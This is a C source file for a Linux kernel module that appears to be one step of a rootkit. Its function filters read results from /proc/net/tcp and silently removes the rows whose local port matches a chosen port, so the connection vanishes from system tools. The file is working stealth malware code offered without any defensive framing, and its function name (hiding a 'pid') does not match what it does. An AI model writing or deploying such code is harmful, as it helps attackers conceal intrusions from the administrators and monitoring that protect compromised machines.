#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include "step3.h"
#include "helpers.h"
#include <linux/string.h>
#include <linux/sprintf.h>

ssize_t
step3_hide_pid(char *read_block_id, char *read_path, char *read_buffer, size_t read_buffer_size, int port_to_hide) {

    // not relevant to step3
    if (strcmp(read_block_id, "proc") != 0 || !ends_with(read_path, "/net/tcp"))
        return -1;


    char *row_start = read_buffer;
    int new_length = 0;
    for (int row = 0; *row_start != '\0'; row++) {
        int row_length = 0;

        // go to end of line
        while (*(row_start + row_length) != '\n') ++row_length;
        // skip \n
        ++row_length;

        if (row == 0) {
            // "Skip" first row
            new_length += row_length;
        } else {
            int index = -1;
            unsigned long address = -1;
            unsigned short port = -1;

            int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);

            if (result == 3) {
                // writes line sequentially except line to hide,
                // so when line needs to be hidden it will be overriden or ignore with the new length
                if (port != port_to_hide) {
                    memcpy(read_buffer + new_length, row_start, row_length);
                    new_length += row_length;
                }
            } else {
                pr_warn("Cant Parse line \n");
                new_length += row_length;
            }
        }
        row_start += row_length;
    }

    // read syscall returns the number of bytes it read
    return new_length;
}
